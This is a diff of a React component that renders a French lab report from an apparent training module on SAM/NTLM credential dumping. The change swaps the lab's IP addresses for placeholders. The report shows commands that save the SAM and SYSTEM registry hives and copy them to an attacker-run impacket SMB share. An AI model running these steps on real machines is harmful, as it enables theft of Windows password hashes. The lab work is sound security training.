@@ -6,7 +6,7 @@ export default function RapportCredentialDumping() {
       <ReportHeader
         title="Credential Dumping — SAM / NTLM"
         subtitle="Chapitre 6, Module 5 · MITRE T1003.002 (OS Credential Dumping: SAM)"
-        meta="24 juin 2026 · Kali 192.168.56.100 → Windows Server 2022 192.168.56.101 · Wazuh 4.12.0"
+        meta="24 juin 2026 · Kali [KALI] → Windows Server 2022 [SERVEUR] · Wazuh 4.12.0"
       />
 
       <H2>1. Objectif</H2>
@@ -28,9 +28,9 @@ reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.hive`}</Cmd>
 
       <H3>Étape 3 à 5 — Exfiltrer via un partage SMB</H3>
       <Cmd term="Kali">{`impacket-smbserver share /tmp/loot -smb2support -username kali -password kali`}</Cmd>
-      <Cmd term="Windows Server — PowerShell Admin">{`net use \\\\192.168.56.100\\share /user:kali kali
-copy C:\\Windows\\Temp\\sam.hive    \\\\192.168.56.100\\share\\sam.hive
-copy C:\\Windows\\Temp\\system.hive \\\\192.168.56.100\\share\\system.hive`}</Cmd>
+      <Cmd term="Windows Server — PowerShell Admin">{`net use \\\\[KALI]\\share /user:kali kali
+copy C:\\Windows\\Temp\\sam.hive    \\\\[KALI]\\share\\sam.hive
+copy C:\\Windows\\Temp\\system.hive \\\\[KALI]\\share\\system.hive`}</Cmd>
       <p>
         (Evil-WinRM étant cassé sur le lab, on passe par SMB — méthode alternative valide en pentest
         réel. Windows Server 2022 refuse l'accès invité, d'où les identifiants obligatoires.)
